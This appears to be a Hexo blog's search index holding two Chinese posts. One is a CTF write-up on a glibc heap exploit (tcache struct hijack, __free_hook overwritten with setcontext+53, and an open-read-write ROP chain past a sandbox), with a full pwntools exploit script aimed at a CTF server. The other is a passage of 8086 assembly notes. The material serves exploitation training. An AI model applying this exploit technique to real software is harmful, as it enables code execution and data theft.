<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>setcontext+orw</title>
    <link href="/2023/10/09/setcontext+orw/"/>
    <url>/2023/10/09/setcontext+orw/</url>
    
    <content type="html"><![CDATA[<h1 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h1><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>首先是由于只有一个堆可以被控制, 且最大可申请的堆块大小为<strong>0x78</strong>, 我们需要通过<strong>tcache struct</strong>来利用<strong>ubsorted bin</strong>泄露<strong>libc</strong>.</p><p>然后再<strong>add</strong>, 我们便可以控制<strong>tcache struct</strong>, 然后利用<strong>tcache</strong> 实现任意写.</p><p>由于存在沙箱, 我们不能使用 <strong>one_gadget</strong>, 需要构造<strong>orw</strong>来获取flag</p><p>首先需要解决如何将程序执行流劫持到<strong>orw_rop</strong>的地址, 我们可以利用<strong>setcontext</strong>来做</p><p>一般将<strong>free_hook</strong>或者<strong>malloc_hook</strong>地址的内容替换为<strong>setcontext+53</strong>，也就是<strong>mov rsp, [rdi+0xa0]</strong> </p><p>然后在我们要创建或者释放的堆块的偏移为<strong>0xa0 , 0xa8</strong>的位置分别放置<strong>rop</strong>的地址以及<strong>ret</strong>的地址</p><p>程序流程：执行<strong>free</strong>或者<strong>malloc</strong>后跳转到<strong>setcontext+53</strong>，然后将<strong>rsp</strong>指针指向<strong>orw</strong>链，然后修改<strong>rcx</strong>的值为<strong>ret</strong>指令的地址，<strong>push rcx</strong>，至于其它寄存器的值此处可以不用在意，最后执行<strong>setcontext</strong>末尾后紧邻的<strong>retn</strong>，栈头出栈也还是<strong>ret</strong>指令，然后继续弹出，此时的<strong>rsp</strong>指向的地址正好是<strong>orw</strong>链的开头</p><p>然后是<strong>rop</strong>的长度大于最大可分配的堆块大小, 这里我们可以使用两个堆块来填入<strong>rop</strong></p><h2 id="setcontext利用"><a href="#setcontext利用" class="headerlink" title="setcontext利用"></a>setcontext利用</h2><h3 id="低于glibc-2-29"><a href="#低于glibc-2-29" class="headerlink" title="低于glibc-2.29"></a>低于glibc-2.29</h3><p>(在更高版本中主要参数已经从<strong>rdi</strong>修复成<strong>rdx</strong>)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x7f638914d070</span> &lt;setcontext&gt;: <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rdi</span><br><span class="hljs-number">0x7f638914d071</span> &lt;setcontext+<span class="hljs-number">1</span>&gt;:       <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x128</span>]<br><span class="hljs-number">0x7f638914d078</span> &lt;setcontext+<span class="hljs-number">8</span>&gt;:       <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span><br><span class="hljs-number">0x7f638914d07a</span> &lt;setcontext+<span class="hljs-number">10</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>,<span class="hljs-number">0x2</span><br><span class="hljs-number">0x7f638914d07f</span> &lt;setcontext+<span class="hljs-number">15</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r10d</span>,<span class="hljs-number">0x8</span><br><span class="hljs-number">0x7f638914d085</span> &lt;setcontext+<span class="hljs-number">21</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0xe</span><br><span class="hljs-number">0x7f638914d08a</span> &lt;setcontext+<span class="hljs-number">26</span>&gt;:      <span class="hljs-keyword">syscall</span> <br><span class="hljs-number">0x7f638914d08c</span> &lt;setcontext+<span class="hljs-number">28</span>&gt;:      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-number">0x7f638914d08d</span> &lt;setcontext+<span class="hljs-number">29</span>&gt;:      <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-number">0xfffffffffffff001</span><br><span class="hljs-number">0x7f638914d093</span> &lt;setcontext+<span class="hljs-number">35</span>&gt;:      <span class="hljs-keyword">jae</span>    <span class="hljs-number">0x7f638914d0f0</span> &lt;setcontext+<span class="hljs-number">128</span>&gt;<br><span class="hljs-number">0x7f638914d095</span> &lt;setcontext+<span class="hljs-number">37</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xe0</span>]<br><span class="hljs-number">0x7f638914d09c</span> &lt;setcontext+<span class="hljs-number">44</span>&gt;:      <span class="hljs-keyword">fldenv</span> [<span class="hljs-built_in">rcx</span>]//会造成程序crash<br><span class="hljs-number">0x7f638914d09e</span> &lt;setcontext+<span class="hljs-number">46</span>&gt;:      <span class="hljs-keyword">ldmxcsr</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x1c0</span>]<br><span class="hljs-number">0x7f638914d0a5</span> &lt;setcontext+<span class="hljs-number">53</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa0</span>]<br><span class="hljs-number">0x7f638914d0ac</span> &lt;setcontext+<span class="hljs-number">60</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x80</span>]<br><span class="hljs-number">0x7f638914d0b3</span> &lt;setcontext+<span class="hljs-number">67</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x78</span>]<br><span class="hljs-number">0x7f638914d0b7</span> &lt;setcontext+<span class="hljs-number">71</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x48</span>]<br><span class="hljs-number">0x7f638914d0bb</span> &lt;setcontext+<span class="hljs-number">75</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x50</span>]<br><span class="hljs-number">0x7f638914d0bf</span> &lt;setcontext+<span class="hljs-number">79</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x58</span>]<br><span class="hljs-number">0x7f638914d0c3</span> &lt;setcontext+<span class="hljs-number">83</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x60</span>]<br><span class="hljs-number">0x7f638914d0c7</span> &lt;setcontext+<span class="hljs-number">87</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa8</span>]<br><span class="hljs-number">0x7f638914d0ce</span> &lt;setcontext+<span class="hljs-number">94</span>&gt;:      <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br><span class="hljs-number">0x7f638914d0cf</span> &lt;setcontext+<span class="hljs-number">95</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x70</span>]<br><span class="hljs-number">0x7f638914d0d3</span> &lt;setcontext+<span class="hljs-number">99</span>&gt;:      <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x88</span>]<br><span class="hljs-number">0x7f638914d0da</span> &lt;setcontext+<span class="hljs-number">106</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x98</span>]<br><span class="hljs-number">0x7f638914d0e1</span> &lt;setcontext+<span class="hljs-number">113</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x28</span>]<br><span class="hljs-number">0x7f638914d0e5</span> &lt;setcontext+<span class="hljs-number">117</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x30</span>]<br><span class="hljs-number">0x7f638914d0e9</span> &lt;setcontext+<span class="hljs-number">121</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x68</span>]<br><span class="hljs-number">0x7f638914d0ed</span> &lt;setcontext+<span class="hljs-number">125</span>&gt;:     <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br><span class="hljs-number">0x7f638914d0ef</span> &lt;setcontext+<span class="hljs-number">127</span>&gt;:     <span class="hljs-keyword">ret</span>    <br><span class="hljs-number">0x7f638914d0f0</span> &lt;setcontext+<span class="hljs-number">128</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x398d71</span>]<br><span class="hljs-number">0x7f638914d0f7</span> &lt;setcontext+<span class="hljs-number">135</span>&gt;:     <span class="hljs-keyword">neg</span>    <span class="hljs-built_in">eax</span><br><span class="hljs-number">0x7f638914d0f9</span> &lt;setcontext+<span class="hljs-number">137</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:[<span class="hljs-built_in">rcx</span>],<span class="hljs-built_in">eax</span><br><span class="hljs-number">0x7f638914d0fc</span> &lt;setcontext+<span class="hljs-number">140</span>&gt;:     <span class="hljs-keyword">or</span>     <span class="hljs-built_in">rax</span>,<span class="hljs-number">0xffffffffffffffff</span><br><span class="hljs-number">0x7f638914d100</span> &lt;setcontext+<span class="hljs-number">144</span>&gt;:     <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>从<strong>setcontext+53</strong>开始, 存在一段通过rdi来给各种寄存器赋值的指令, 我们可以利用它来方便的控制一些寄存器的值.</p><p>要注意**mov   rcx, [rdi+0A8h] **和 <strong>push rcx</strong> 实质上是在给我们的 rip 进行赋值</p><p>当我们创建或者释放一个堆块时, 此时的<strong>rdi</strong>就是堆块的<strong>chunk头</strong></p><p>只要控制好偏移, 我们就可以通过调用**__free_hook<strong>或者</strong>__malloc_hook**来将对应偏移位置的内容赋值到各个寄存器中</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-keyword">from</span> ctypes import*<br><span class="hljs-keyword">from</span> struct import*<br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=1<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./a&#x27;</span><br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>,os=&#x27;linux&#x27;,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.anna.nssctf.cn&#x27;,28903)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;./libc.so.6&#x27;)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda c : u64(rc(c).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) <br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>def <span class="hljs-built_in">add</span>(size):<br>sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,str(0))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>,str(size))<br>def <span class="hljs-built_in">edit</span>(content):<br>sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,str(0))<br>sla(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br>def show():<br>sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,str(0))<br>def free():<br>sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,str(0))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">libc_pop_rdi</span>=0x00000000000215bf<br><span class="hljs-attribute">libc_pop_rsi</span>=0x0000000000023eea<br><span class="hljs-attribute">libc_pop_rdx</span>=0x0000000000001b96<br><span class="hljs-attribute">libc_pop_rax</span>=0x0000000000043ae8<br><span class="hljs-attribute">libc_ret</span>=0x00000000000008aa<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>def attack():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start attack&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br><span class="hljs-built_in">add</span>(0x18)<br><span class="hljs-built_in">add</span>(0x68)<br><span class="hljs-built_in">add</span>(0x78)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,4):<br><span class="hljs-built_in">add</span>(0x18)<br><span class="hljs-built_in">add</span>(0x68)<br><span class="hljs-built_in">add</span>(0x18)<br><span class="hljs-built_in">add</span>(0x58)<br>#---<br><span class="hljs-built_in">add</span>(0x28)<br>free()<br><span class="hljs-built_in">edit</span>(p64(0)<span class="hljs-number">*2</span>)<br>free()<br>show()<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br><span class="hljs-attribute">heap_base</span>=u64(rc(6).ljust(8,b&#x27;\x00&#x27;))-(0x55c0ea9a6920-0x55c0ea9a5000)<br><span class="hljs-built_in">edit</span>(p64(heap_base+0x10)<span class="hljs-number">*2</span>)<br><span class="hljs-built_in">add</span>(0x28)<br><span class="hljs-built_in">add</span>(0x28)<br><span class="hljs-attribute">p1</span>=p64(0)*4+p64(0x7000000)<br><span class="hljs-built_in">edit</span>(p1)<br>free()<br><br>show()<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br><span class="hljs-attribute">libc_base</span>=u64(rc(6).ljust(8,b&#x27;\x00&#x27;))-96-0x10-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-attribute">setcontext</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+53<br><span class="hljs-attribute">free_hook</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>syscall= libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + 0xf<br><span class="hljs-attribute">pop_rdi</span>=libc_base+libc_pop_rdi<br><span class="hljs-attribute">pop_rsi</span>=libc_base+libc_pop_rsi<br><span class="hljs-attribute">pop_rdx</span>=libc_base+libc_pop_rdx<br><span class="hljs-attribute">pop_rax</span>=libc_base+libc_pop_rax<br><span class="hljs-attribute">ret</span>=libc_base+libc_ret<br><br><span class="hljs-attribute">flag_addr</span>=heap_base+0x2000<br><span class="hljs-attribute">stack_1</span>=heap_base+0x2100<br><span class="hljs-attribute">stack_2</span>=heap_base+0x21a0<br><span class="hljs-attribute">rop_addr</span>=heap_base+0x2200<br><br><span class="hljs-attribute">rop</span>=p64(pop_rdi)+p64(flag_addr)<br>rop+=p64(pop_rsi)+p64(0)<br>rop+=p64(pop_rax)+p64(2)<br>rop+=p64(syscall)<br>rop+=p64(pop_rdi)+p64(3)<br>rop+=p64(pop_rsi)+p64(flag_addr)<br>rop+=p64(pop_rdx)+p64(0x30)<br>rop+=p64(pop_rax)+p64(0)<br>rop+=p64(syscall)<br>rop+=p64(pop_rdi)+p64(1)<br>rop+=p64(pop_rsi)+p64(flag_addr)<br>rop+=p64(pop_rdx)+p64(0x30)<br>rop+=p64(pop_rax)+p64(1)<br>rop+=p64(syscall)<br><span class="hljs-built_in">print</span>(len(rop))<br><br><span class="hljs-built_in">add</span>(0x78)<br><span class="hljs-attribute">p2</span>=p64(0x0202020202020202)<br>p2+=p64(0)<span class="hljs-number">*7</span><br>p2+=p64(free_hook)#0x20_free_hook<br>p2+=p64(heap_base+0x2000)#0x30_flag_addr<br>p2+=p64(heap_base+0x2050)#0x40<br>p2+=p64(heap_base+0x2100)#0x50_stack_1<br>p2+=p64(heap_base+0x21a0)#0x60_stack_2<br>p2+=p64(heap_base+0x2200)#0x70_rop_1<br>p2+=p64(heap_base+0x2260)#0x80_rop_2<br><span class="hljs-built_in">edit</span>(p2)<br><br><span class="hljs-built_in">add</span>(0x10)<br><span class="hljs-attribute">p3</span>=p64(setcontext)<br><span class="hljs-built_in">edit</span>(p3)<br><span class="hljs-built_in">add</span>(0x20)<br><span class="hljs-attribute">p4</span>=b&#x27;./flag\x00\x00&#x27;<br><span class="hljs-built_in">edit</span>(p4)<br><span class="hljs-built_in">add</span>(0x50)<br><span class="hljs-attribute">p5</span>=p64(rop_addr)+p64(ret)<br><span class="hljs-built_in">edit</span>(p5)<br><span class="hljs-built_in">add</span>(0x60)<br><span class="hljs-attribute">p6</span>=rop[:0x60]<br><span class="hljs-built_in">edit</span>(p6)<br><span class="hljs-built_in">add</span>(0x70)<br><span class="hljs-attribute">p7</span>=rop[0x60:]<br><span class="hljs-built_in">edit</span>(p7)<br><br><span class="hljs-built_in">add</span>(0x40)<br>free()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;free_hook:&#x27;</span>,hex(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;setcontext:&#x27;</span>,hex(setcontext))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base:&#x27;</span>,hex(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;heap_base:&#x27;</span>,hex(heap_base))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>attack()<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言</title>
    <link href="/2023/09/12/%E6%B1%87%E7%BC%96/"/>
    <url>/2023/09/12/%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<h1 id="1基础"><a href="#1基础" class="headerlink" title="1基础"></a>1基础</h1><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>汇编指令（核心）</p><p>伪指令</p><p>其他符号：+ - * /等 ，由编译器识别</p><h2 id="指令与数据"><a href="#指令与数据" class="headerlink" title="指令与数据"></a>指令与数据</h2><p>相同的二进制信息，计算机既可以看作数据，也可以看作指令。</p><h2 id="CPU对存储器的读写"><a href="#CPU对存储器的读写" class="headerlink" title="CPU对存储器的读写"></a>CPU对存储器的读写</h2><h5 id="必要的三类信息的交互："><a href="#必要的三类信息的交互：" class="headerlink" title="必要的三类信息的交互："></a>必要的三类信息的交互：</h5><p>存储单元的地址（地址信息）</p><p>器件的选择，读或写（控制信息）</p><p>数据（数据信息）</p><h1 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.寄存器"></a>2.寄存器</h1><h2 id="通用寄存器："><a href="#通用寄存器：" class="headerlink" title="通用寄存器："></a>通用寄存器：</h2><p>字的位数叫作字长，cpu一次处理二进制代码的位数。</p><p>对16位寄存器（只能放4位16进制数据）</p><p>例如：AX BX CX DX（8086cpu）</p><p>AX可以分为AH，AL（两个8位寄存器）（其余同）</p><p>当al或者ah被单独操作时，它们是独立的</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">mov</span> a,<span class="hljs-keyword">b</span><span class="hljs-comment">//a=b</span><br><span class="hljs-keyword">add</span> a,<span class="hljs-keyword">b</span> <span class="hljs-comment">//a=a+b</span><br></code></pre></td></tr></table></figure><p>当寄存器中16进制时超出4位，进位不会被保存</p><h2 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h2><p>对于16位：</p><p>运算器一次性最多处理16位</p><p>寄存器最大16位</p><p>寄存器与运算器通路16位</p><h2 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h2><p>每一个内存单元在存储空间（一维的线性空间）中的唯一地址</p><p>例如</p><p>8086cpu有20位地址总线，又是16位的</p><p>会采用使用2个16位地址来合成一个20位的物理地址（段地址+偏移地址）（在地址加法器中）</p><p>物理地址=段地址*16（又叫左移4个二进制位）+偏移地址</p><h2 id="段"><a href="#段" class="headerlink" title="段"></a>段</h2><p>对于16位</p><p>偏移地址为16位（64kb），段的最大长度为64kb</p><h4 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h4><p>存放段地址</p><p>例如8086cpu由CS,DS,SS,ES（4个段寄存器）存放段地址</p><h2 id="8086cpu"><a href="#8086cpu" class="headerlink" title="8086cpu"></a>8086cpu</h2><p>cpu会从M（CS内容）*16+N（IP内容）单元开始</p><h5 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h5><p>代码段寄存器</p><h5 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h5><p>指令指针寄存器</p><h4 id="修改CS与IP"><a href="#修改CS与IP" class="headerlink" title="修改CS与IP"></a>修改CS与IP</h4><p>使用jmp指令（16进制）</p><p>jmp 段地址:偏移地址</p><p>用段地址修改CS，用偏移地址修改IP</p><h5 id="仅修改ip"><a href="#仅修改ip" class="headerlink" title="仅修改ip"></a>仅修改ip</h5><p>jmp 某一个合法寄存器</p><p>用寄存器中的值修改IP</p><h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><p>编程时，将一组内存单元定义为一个段，将一组代码存在这一组单元中，便定义了一个代码段</p><p>由于cpu只认CS:IP，cpu不会因为这种定义就把它们当作指令执行</p><p>要将CS:IP指向代码段第一条指令的首地址，代码段才得到执行</p><h1 id="3-寄存器（内存访问）"><a href="#3-寄存器（内存访问）" class="headerlink" title="3.寄存器（内存访问）"></a>3.寄存器（内存访问）</h1><h2 id="字的存储"><a href="#字的存储" class="headerlink" title="字的存储"></a>字的存储</h2><p>对于一个16位的寄存器，高8位放高字节，低8位放低字节</p><p>例如有0，1两个存储单元，对于4E20H；</p><p>0（低位）：20，1（高位）：4E</p><p>字单元：存放一个字型数据的内存单元</p><p>对于一个起始地址为N的字单元，简称为N地址单元</p><h2 id="DS与address"><a href="#DS与address" class="headerlink" title="DS与address"></a>DS与address</h2><p>在8086cpu中，有一个DS寄存器，存放要访问的数据的段地址</p><p>对于    mov al,[0]</p><p>将一个内存单元中的内容送入一个寄存器</p><p>[0]表示一个内存单元，0表示偏移地址，段地址是DS里的数据</p><p>由于8086不支持直接送入数据到DS，可以使用一个寄存器进行中转（如bx）</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>mov</p><p>add（加法）</p><p>sub（减法）</p><h2 id="栈"><a href="#栈" class="headerlink" 